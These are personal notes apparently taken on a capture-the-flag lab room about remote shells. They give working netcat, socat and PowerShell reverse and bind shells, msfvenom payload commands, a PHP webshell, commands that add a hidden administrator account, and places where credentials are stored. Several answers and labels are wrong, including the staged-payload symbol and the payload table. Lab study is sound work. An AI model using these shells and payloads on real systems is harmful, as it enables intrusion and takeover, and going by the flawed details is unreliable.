

# What is shell?

In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI), also known as BASH _born again shells_ for Linux and for Windows Powershell.

When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).

## Task 2

There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell.

- `Netcat` is the "Swiss Army Knife" of networking, it grabs banners, receieve reverse shells and connect to remote ports attached to bind shells on a target system and are unstable connections

- `Socat` is an improved Netcat and is more stable but the syntax is difficult and Socat needs to be installed (rarely by default)

- Windows has a `.exe` version for both
- Metasploit `exploit/multi/handler` framework has reverse shell capabilities with various options and is only way to interact with a meterpreter shell which also does staged payloads

- Kali Linux has some installed webshells `/usr/share/webshells` and some webshells are in SecLists folder

## Task 3

The 2 types of shells we are interested in are: reverse shells and bind shells.

- `reverse shell` = when the target is forced to execute code that connects back to your computer. On your computer you set up a listener which would receive the connection. Reverse shells bypass firewall rules that block connecting to a random port on the target. Setting up a listener requires configuring your own computer to accept the shell

- `bind shell` = when code is executed on the target and the listener attached to the shell is directly on the target. This shell is opened to the internet which can connect to the port that the code has opened and obtain remote code execution. This does not require any configuration on your computer network but could be blocked by firewalls protecting the target. 

- Reverse shells are easier to execute and debug.

- Shells can be `interactive` (Bash, Zsh, sh, SSH, etc Command Line Interface (CLI)) or `non-interactive` (majority of simple reverse shells and are limited to using programs that do not have interactivity)
  

Question: _Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?_

- R

Question: _You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)_

- N

Question: _When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?_

- Target, the target machine needs to listen for commands

## Task 4 

Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking. With it we can do a wide variety of interesting things, but let's focus for now on shells. There are various ways to execute a shell, but start off with listeners.

Linux netcat listener syntax:

- `nc -lvnp <PORT>`
- `l` is netcat listener
- `v` is request verbose output
- `n` tells netcat not to resolve host names or use DNS
- `p` indicates the port specified 
- any port under 1024 requires `sudo` to start listener
- common ports are 80, 443 and 53
- example: `sudo nc -lvnp 443`

If wanting to get a bind shell on a target then we can assume that there
is already a listener waiting for us on a chosen port of the target and just need 
to connect to it.

- `nc <TARGET IP> <PORT> 
- netcat for outbound connection to chosen port

Question: _Which option tells netcat to listen?_

- `-l`

Question: _How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?_

- `nc 10.10.10.11 8080`

## Task 5

Connected to a shell and pressing `Ctrl + C` kills the non-interactive 
shell connection which often have strange formatting errors. _Netcat shells
are truly processes running inside a terminal_. Stabilizing these shells on Linux system is doable but on a Windows system is harder to do.

### Stabilizing Shell 1

Python is installed by default on Linux machines (Mac as well).

- step 1: `python -c 'import pty;pty.spawn("/bin/bash")'` which spawns a bash shell, sometimes the Python version needs to be specified.
- step 2: `export TERM=xterm` which gives us access to term commands like `clear`
- step 3: background the shell `Ctrl + Z` and on our terminal we use `stty raw -echo; fg` as this turns off our own terminal echo (and other commands) and foregrounds the shell
- if the shell dies you won't see input, to fix this type `reset` + Enter

### Stabilizing Shell 2

This technique uses `rlwrap` which is a program that gives access to history,
tab completion and arrow keys once you get a shell. This program is not installed by default on Kali, to install `sudo apt install rlwrap`.

- syntax: `rlwrap nc -lvnp <PORT>` this adds functionality & stability to our shell

### Stabilizing Shell 3 

Socat technique is for Linux shells (no benefit for Windows over netcat).
This method requires file transfer of a socat static binary to a target machine,
the process is:

- use a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`)
- on target machine use netcat shell to download the file (`wget <Local IP>/socat -O /tmp/socat`)
- Windows Powershell: `Invoke-WebRequest -uri <Local IP>/socat.exe -outfile C:\\Windows\temp\socat.exe` 
- in another terminal, to change terminal tty size `tty rows <NUM> cols <NUM>` which changes the terminal size

Question: _How would you change your terminal size to have 238 columns?_

- stty cols 238

Question: _What is the syntax for setting up a python3 webserver on port 80?_

- `sudo python3 -m http.server 80`

## Task 6

Think of socat as a connector between 2 points, 1 listening port + keyboard or file or listening port. Socat provides a link between 2 points. 

- Reverse Shell _(llehs esrever)_ : `socat TCP-L: <port>`
- listening port and standard input being connected, unstable connection
- Windows: `socat TCP: <local IP>:<local PORT> EXEC:powershell.exe, pipes` the pipes option
- Linux: `socat TCP:<local IP>:<local PORT> EXEC:"bash -li"`

BIND SHELLS:

- Linux: `socat TCP-L:<PORT> EXEC:"bash -li"`
- Windows:  `socat TCP-L:<PORT> EXEC:powershell.exe, pipes` pipes for a interface
- generic: `socat TCP:<TARGET IP>:<TARGET-PORT>`

For a fully stable Linux reverse shell for listener

- `socat TCP-L:<PORT> FILE:`tty`, raw, echo=0`
- listening port and a file
- pass in the TTY and setting a echo to be 0

A socat listener with a payload, it requires that socat is installed on 
the target machine or have the precompiled socat binary to pass as an 
argument to be executed.

- `socat TCP:<attacker IP>:<attacker PORT> EXEC:"bash -li", pty, stderr,sigint, setid, sane`
- `pty` allocates a fake terminal on target (part of stabilization)
- `stderr` ensures any error message gets shown in the shell
- `sigint` allows the Ctrl + C kill command
- `setsid` creates the process in a new session
- `sane` stabilizes the terminal "normalize"

Socat shell is interactive and allows for SSH commands. 

Question: _How would we get socat to listen on TCP port 8080?_

- tcp-l:8080

## Task 7 

Socat can do encrypted shells, both bind and reverse, which can bypass
intrusion detection systems. We replace `TCP` for `OPENSSL` when 
working with encryped shells.

1. generate a certificate to encrypt the shells `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

- this creates a 2048 bit RSA key with matching cert file, self signed, valid for just under a year, you can leave the certificate information blank when prompted

2. we need to merge the 2 created files into a single `.pem` file: `cat shell.key shell.crt > shell.pem`
3. when setting up the listener we use `socat OPENSSL-LISTEN:<PORT>, cert=shell.pem, verify=0 -`

- this sets up a OPENSSL listener using our generated certificate, which we have no validation of the certificate. This certificate must be used on whichever device is listening.

4. to connect back: `socat OPENSSL:<local IP>:<local IP>, verify=0 EXEC:/bin/bash` same process for bind shells
5. target: `socat OPENSSL-LISTEN:<PORT>, cert=shell.pem, verify=0 EXEC:cmd.exe, pipes`
6. attacker: `socat OPENSSL:<target IP>:<target PORT>, verify=0 -`

Even for a Windows target the certifcate must be used with the listener, so copying the PEM file across for a bind shell is required.

Question: _What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"_

- hint: The syntax for this without the OPENSSL encryption is: socat TCP-L:53 FILE:`tty`,raw,echo=0
- `socat openssl-listen:53, cert=encrypt.pem,verify=0 FILE:tty, raw, echo=0`

Question: _If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?_

- The syntax for this without the OPENSSL encryption is: socat TCP:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
- `socat openssl:10.10.10.5:53, verify=0  EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

## Task 8

Netcat has a listener bindshell, which has `nc.exe` for Windows and can be found in the `/usr/share/windows-resources/binaries` and there is the option of `-e` which allows for executing the program on connection as a listener.

- generate a listener bind shell on the target `nc -lvnp <PORT> -e /bin/bash` 
- reverse shell connecting back on target `nc <local IP> <PORT> -e /bin/bash` {not secure}
- Linux listener for bind shell `mkfifo /tmp/f; nc -lvnp <PORT> </tmp/f | /bin/sh>/tmp/f 2>&1; rm /tmp/f`
- the `/tmp/f` is a named pipe, `mkfifo` creates a named pipe

A Windows 1 line command that is put inside a cmd.exe shell is for reverse shell executing commands on a Windows server:

```{c}
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Question: _What command can be used to create a named pipe in Linux?_

- `mkfifo`

## Task 9

Msfvenom is the place to get payloads, it is part of Metasploit framework that generate code for reverse and bind shells. These explouts are low level development which makes hexadecimal shellcode when making payloads in various formats (.exe, .aspx, .war, .py).

- syntax: `msfvenom -p <PAYLOAD> <OPTIONS>` 
- for reverse shell on Windows: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen PORT>`

STAGED REVERSE SHELLS

- staged payloads are send in 2 parts
- 1: stager = piece of code which is executed directly on the server itself. This is the _init_ stager, it connects back to the waiting listener but does not contain any reverse shell code itself. 
- 2: The stager connects to the listener to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.

STAGELESS REVERSE SHELLS

- stageless payloads are more common, self contained 1 program executed that send back a shell immediately to the waiting listener
- stageless payloads are easier to use and catch, but are bulkier which can be detected by anti-virus software
- modern anti-virus software use Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager

Meterpreter shells are from Metasploit, they are fully featured shells, stable and are good to use with a Windows Target. They allow for file upload and download.

Payload naming conventions for msfvenom

| syntax                               | description (stageless)       |
|--------------------------------------|-------------------------------|
| `<OS>/<arch>/<payload>`              | basic syntax                  |
| `msfvenom --list payloads`           | available payloads            |
| linux/x86/shell_reverse_tcp          | reverse shell Linux           |
| windows/shell_reverse_tcp            | Windows 32bit no arch         |
| windows/x86/shell_reverse_tcp        | Windows 32bit arch            |
| windows/x64/meterpreter_reverse_tcp  | staged payload                |
| linux/x86/meterpreter_reverse_tcp    | 32bit stageless               |

- `msfvenom --list payloads | grep "linux/x86/meterpreter"`

Question: _Generate a staged reverse shell for a 64 bit Windows target, in a .exe format using your TryHackMe tun0 IP address and a chosen port._

- `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.11.12.223 LPORT=443`

Question: _Which symbol is used to show that a shell is staged?_

- `_`

Question: _What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell_

- `msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443`

## Task 10 

Metasploit multi/handler is a tool for catching reverse shells, and is
essential for Meterpreter shells for staged payloads.

- terminal `msfconsole`
- `use multi/handler` hit enter and starts the session with `options`
- `set PAYLOAD <payload>`
- `set LHOST <IP>`
- `set LPORT <PORT>`
- exploit -j command which launches the _job_ in the background
- sudo must be used
- sessions 1 for foreground, sessions <num>

## Task 11 

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage: either through a HTML form, or directly as arguments in the URL: which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.

- PHP: `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>` this will take a GET request in the url and execute it on the system shell_exec(), any commands entered after `?cmd=` will be run
- website: `10.10.84.199/uploads/shell.php?cmd=ifconfig` the ifconfig will run

## Task 12

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh `are often an ideal way to do this.
In CTFs its a way to find credentials. 

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml or C:\xampp\FileZilla Server\FileZilla Server.xml. These can be MD5 hashes or in plaintext, depending on the version.

it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

- syntax: `net user <username> <password> /add`
- syntax: `net localgroup administrators <username> /add`

Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. 

## Task 13 

- Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.

- Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.

- Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.

- Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

- Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.

- Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?

- Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.

- The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.

- Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

- Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.

- Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat: does this work?

## Task 14

The box attached to this task is an Ubuntu server with a file upload page running on a webserver. This should be used to practice shell uploads on Linux systems. Equally, both socat and netcat are installed on this machine, so please feel free to log in via SSH on port 22 to practice with those directly. The credentials for logging in are:

- Username: shell
- Password: TryH4ckM3!

## Task 15 

This task contains a Windows 2019 Server box running a XAMPP webserver. This can be used to practice shell uploads on Windows. Again, both Socat and Netcat are installed, so feel free to log in over RDP or WinRM to practice with these. The credentials are:

- Username: Administrator
- Password: TryH4ckM3!
- To login using RDP: `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'`

## Reference

- [GitHub: reverse shell cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Linux Journal: Intro to named pipes](https://www.linuxjournal.com/article/2156)
- [Medium: What is Shell Walkthrough](https://medium.com/@JAlblas/tryhackme-what-the-shell-walkthrough-6c0ebe8f854e)
- 

